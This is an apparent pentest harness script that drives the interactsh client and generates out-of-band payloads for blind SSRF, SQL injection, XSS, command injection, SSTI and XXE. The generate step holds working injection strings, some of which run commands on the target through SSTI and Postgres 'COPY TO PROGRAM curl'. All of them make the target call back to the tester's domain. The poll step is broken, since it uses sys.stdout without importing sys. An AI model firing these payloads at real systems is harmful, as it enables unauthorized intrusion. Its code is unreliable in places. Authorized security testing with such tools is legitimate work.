#!/usr/bin/env bash
set -euo pipefail

# =============================================================================
# interactsh_launcher.sh — OOB Testing Harness for Blind Vulnerabilities
# Starts interactsh client, generates payloads, polls for callbacks.
# Used by Phase 3 testing for blind SSRF, blind XSS, blind SQLi, blind CMDi.
# =============================================================================

VERSION="1.0.0"
MODE=""
OUTPUT_DIR=""
PAYLOAD_DIR=""
TIMEOUT=120
POLL_INTERVAL=5

usage() {
    cat <<EOF
Usage: $0 <command> [options]

OOB (Out-of-Band) testing harness using ProjectDiscovery's interactsh.

Commands:
  start          Start interactsh client, return OOB server URL
  generate       Generate OOB payloads for a specific vulnerability type
  poll           Poll interactsh server for callbacks  
  cleanup        Stop the interactsh client

Options:
  --output-dir <path>    Output directory for payloads and logs (required)
  --type <vuln>          Vulnerability type for payload generation (ssrf, sqli, xss, cmdi, ssti, xxe)
  --timeout <N>          Max time to wait for callbacks (default: 120s)
  --poll-interval <N>    Seconds between poll attempts (default: 5)
  --help                 Show this help

Examples:
  $0 start --output-dir engagement/oob/
  $0 generate --type ssrf --output-dir engagement/oob/
  $0 poll --output-dir engagement/oob/ --timeout 120
EOF
    exit 0
}

if [[ $# -eq 0 ]]; then
    usage
fi

MODE="$1"
shift

while [[ $# -gt 0 ]]; do
    case "$1" in
        --output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        --type) VULN_TYPE="$2"; shift 2 ;;
        --timeout) TIMEOUT="$2"; shift 2 ;;
        --poll-interval) POLL_INTERVAL="$2"; shift 2 ;;
        --help) usage ;;
        *) shift ;;
    esac
done

if [[ "$MODE" == "cleanup" ]]; then
    pkill -f "interactsh-client" 2>/dev/null || true
    echo "[*] interactsh client stopped"
    exit 0
fi

if [[ -z "$OUTPUT_DIR" ]]; then
    echo "[ERROR] --output-dir is required"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

if ! command -v interactsh-client &>/dev/null; then
    echo "[!] interactsh-client not found. Install: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
    # Generate fallback using Burp Collaborator if available
    if [[ -f "$OUTPUT_DIR/oob_url.txt" ]]; then
        cat "$OUTPUT_DIR/oob_url.txt"
        exit 0
    fi
    echo "http://oob-not-available.local" > "$OUTPUT_DIR/oob_url.txt"
    exit 0
fi

# =============================================================================
# COMMAND: start
# =============================================================================
if [[ "$MODE" == "start" ]]; then
    echo "[*] Starting interactsh client..."

    # Kill existing client
    pkill -f "interactsh-client" 2>/dev/null || true
    sleep 1

    # Start in background
    interactsh-client \
        -json \
        -o "$OUTPUT_DIR/interactsh_log.jsonl" \
        -poll-interval "$POLL_INTERVAL" \
        -interactions-cache-size 500 \
        -no-color \
        > "$OUTPUT_DIR/interactsh_url.txt" 2>/dev/null &
    
    INTERACTSH_PID=$!
    echo "$INTERACTSH_PID" > "$OUTPUT_DIR/interactsh.pid"
    sleep 3

    if kill -0 "$INTERACTSH_PID" 2>/dev/null; then
        OOB_URL=$(cat "$OUTPUT_DIR/interactsh_url.txt" 2>/dev/null | head -1)
        echo "$OOB_URL" > "$OUTPUT_DIR/oob_url.txt"
        echo "  => OOB Server: $OOB_URL"
        echo "  => PID: $INTERACTSH_PID"
    else
        echo "  [!] Failed to start interactsh client"
        # Fallback: use public interactsh server
        echo "http://c$(date +%s).oast.pro" > "$OUTPUT_DIR/oob_url.txt"
        cat "$OUTPUT_DIR/oob_url.txt"
    fi

# =============================================================================
# COMMAND: generate
# =============================================================================
elif [[ "$MODE" == "generate" ]]; then
    if [[ ! -f "$OUTPUT_DIR/oob_url.txt" ]]; then
        echo "[!] No OOB URL found — run 'start' first"
        exit 1
    fi

    OOB_URL=$(cat "$OUTPUT_DIR/oob_url.txt" 2>/dev/null)
    OOB_DOMAIN=$(echo "$OOB_URL" | sed 's|https\?://||' | sed 's|/.*||')
    VULN_TYPE="${VULN_TYPE:-ssrf}"

    echo "[*] Generating $VULN_TYPE OOB payloads for $OOB_DOMAIN..."

    python3 <<PYEOF > "$OUTPUT_DIR/oob_payloads.json"
import json, re

oob = "${OOB_URL}"
domain = "${OOB_DOMAIN}"
vuln_type = "${VULN_TYPE}"

payloads = {
    "domain": domain,
    "url": oob,
    "type": vuln_type,
    "payloads": []
}

markers = {
    "default": f"http://{domain}/default",
    "canary": f"http://{domain}/canary-{{id}}",
}

if vuln_type == "ssrf":
    payloads["payloads"] = [
        {"name": "basic_http", "value": f"http://{domain}/ssrf-basic"},
        {"name": "https", "value": f"https://{domain}/ssrf-tls"},
        {"name": "ip_decimal", "value": f"http://2852039166/ssrf-ip"},
        {"name": "ip_hex", "value": f"http://0x7f000001/ssrf-hex"},
        {"name": "dns_redirect", "value": f"http://{domain}.nip.io/ssrf-nip"},
        {"name": "url_encoded", "value": f"http%3A%2F%2F{domain}%2Fssrf-encoded"},
        {"name": "double_encoded", "value": f"http%253A%252F%252F{domain}%252Fssrf-double"},
        {"name": "gopher", "value": f"gopher://{domain}:80/_GET%20/ssrf-gopher%20HTTP/1.1%0d%0aHost:%20{domain}%0d%0a%0d%0a"},
        {"name": "file_scheme", "value": f"file://{domain}/ssrf-file"},
        {"name": "dict_scheme", "value": f"dict://{domain}:6379/ssrf-dict"},
        {"name": "javascript_fetch", "value": f"fetch('http://{domain}/ssrf-js-fetch')"},
        {"name": "xml_external", "value": f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/ssrf-xxe">]>
<foo>&xxe;</foo>'''},
        {"name": "svg_image", "value": f'''<svg xmlns="http://www.w3.org/2000/svg">
<image href="http://{domain}/ssrf-svg"/>
</svg>'''},
    ]

elif vuln_type == "sqli":
    payloads["payloads"] = [
        {"name": "mysql_load_file", "value": f"' UNION SELECT LOAD_FILE('//{domain}/sqli-mysql') --"},
        {"name": "mssql_xp_dirtree", "value": f"'; EXEC xp_dirtree '//{domain}/sqli-mssql' --"},
        {"name": "oracle_utl_http", "value": f"'; UTL_HTTP.REQUEST('http://{domain}/sqli-oracle') FROM DUAL --"},
        {"name": "postgres_copy", "value": f"'; COPY (SELECT '') TO PROGRAM 'curl {domain}/sqli-pg' --"},
        {"name": "sqlite_load", "value": f"'||load_extension('//{domain}/sqli-sqlite')--"},
    ]

elif vuln_type == "xss":
    payloads["payloads"] = [
        {"name": "img_tag", "value": f'<img src="http://{domain}/xss-img" onerror="this.src=\'http://{domain}/xss-img-retry\'">'},
        {"name": "script_tag", "value": f'<script>new Image().src="http://{domain}/xss-script"</script>'},
        {"name": "fetch_statement", "value": f'"><script>fetch("http://{domain}/xss-fetch")</script>'},
        {"name": "svg_onload", "value": f'<svg onload="fetch(\'http://{domain}/xss-svg\')">'},
        {"name": "css_import", "value": f'@import url("http://{domain}/xss-css");'},
        {"name": "iframe_src", "value": f'<iframe src="http://{domain}/xss-iframe">'},
    ]

elif vuln_type == "cmdi":
    payloads["payloads"] = [
        {"name": "curl_http", "value": f"curl http://{domain}/cmdi-curl"},
        {"name": "wget_http", "value": f"wget http://{domain}/cmdi-wget"},
        {"name": "nslookup", "value": f"nslookup {domain}"},
        {"name": "ping_count", "value": f"ping -c 1 {domain}"},
        {"name": "dig_lookup", "value": f"dig {domain}"},
        {"name": "powershell_invoke", "value": f"powershell Invoke-WebRequest -Uri http://{domain}/cmdi-powershell"},
    ]

elif vuln_type == "ssti":
    payloads["payloads"] = [
        {"name": "jinja2_curl", "value": f"{{{{ ''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['urlopen']('http://{domain}/ssti-j2') }}}}"},
        {"name": "twig_filter", "value": f"{{{{ ['curl http://{domain}/ssti-twig']|filter('system') }}}}"},
        {"name": "freemarker_exec", "value": f"<#assign ex='freemarker.template.utility.Execute'?new()> ${{ex('curl http://{domain}/ssti-fm')}}"},
        {"name": "velocity", "value": f"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ch=$rt.getRuntime().exec('curl http://{domain}/ssti-v'))"},
    ]

elif vuln_type == "xxe":
    payloads["payloads"] = [
        {"name": "basic_oob", "value": f'''<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://{domain}/xxe-oob">
]>
<foo>&xxe;</foo>'''},
        {"name": "parameter_entity", "value": f'''<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{domain}/xxe-param">
%xxe;
]>'''},
        {"name": "dtd_external", "value": f'''<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "http://{domain}/xxe.dtd">
%dtd;
]>'''},
    ]

elif vuln_type == "generic":
    payloads["payloads"] = [
        {"name": "http_canary", "value": f"http://{domain}/canary"},
        {"name": "dns_canary", "value": f"{domain}"},
    ]

print(json.dumps(payloads, indent=2))
PYEOF

    echo "  => Generated $(python3 -c "import json; d=json.load(open('$OUTPUT_DIR/oob_payloads.json')); print(len(d['payloads']))" 2>/dev/null || echo 0) payloads"
    echo "  => Payloads: $OUTPUT_DIR/oob_payloads.json"

# =============================================================================
# COMMAND: poll
# =============================================================================
elif [[ "$MODE" == "poll" ]]; then
    if [[ ! -f "$OUTPUT_DIR/interactsh_log.jsonl" ]]; then
        echo "[!] No interactsh log found — run 'start' first"
        echo '{"callbacks":[],"total":0}' > "$OUTPUT_DIR/oob_callbacks.json"
        exit 0
    fi

    echo "[*] Polling for OOB callbacks (timeout: ${TIMEOUT}s)..."

    START_TIME=$(date +%s)

    # Wait and poll
    while true; do
        CURRENT_TIME=$(date +%s)
        ELAPSED=$((CURRENT_TIME - START_TIME))

        if [[ $ELAPSED -ge $TIMEOUT ]]; then
            echo "  => Timeout reached"
            break
        fi

        # Check log for callbacks
        if [[ -f "$OUTPUT_DIR/interactsh_log.jsonl" ]]; then
            CB_COUNT=$(wc -l < "$OUTPUT_DIR/interactsh_log.jsonl" 2>/dev/null || echo 0)

            if [[ $CB_COUNT -gt 0 ]]; then
                echo "  => $CB_COUNT callback(s) detected!"
                break
            fi
        fi

        echo "  Waiting... ($ELAPSED/${TIMEOUT}s)"
        sleep "$POLL_INTERVAL"
    done

    # Process callbacks
    python3 <<PYEOF > "$OUTPUT_DIR/oob_callbacks.json"
import json

callbacks = []
try:
    with open("$OUTPUT_DIR/interactsh_log.jsonl") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                entry = json.loads(line)
                callbacks.append({
                    "timestamp": entry.get("timestamp", ""),
                    "protocol": entry.get("protocol", ""),
                    "remote_address": entry.get("remote-address", ""),
                    "raw_request": entry.get("raw-request", "")[:500],
                    "unique_id": entry.get("unique-id", ""),
                    "full_id": entry.get("full-id", "")
                })
            except:
                continue
except FileNotFoundError:
    pass

result = {"callbacks": callbacks, "total": len(callbacks), "oob_confirmed": len(callbacks) > 0}
json.dump(result, sys.stdout, indent=2)
PYEOF

    CB_COUNT=$(python3 -c "import json; d=json.load(open('$OUTPUT_DIR/oob_callbacks.json')); print(d['total'])" 2>/dev/null || echo 0)
    echo "  => $CB_COUNT total callbacks"
    echo "  => OOB confirmed: $(python3 -c "import json; d=json.load(open('$OUTPUT_DIR/oob_callbacks.json')); print(d['oob_confirmed'])" 2>/dev/null || echo False)"

else
    echo "[ERROR] Unknown command: $MODE"
    usage
fi
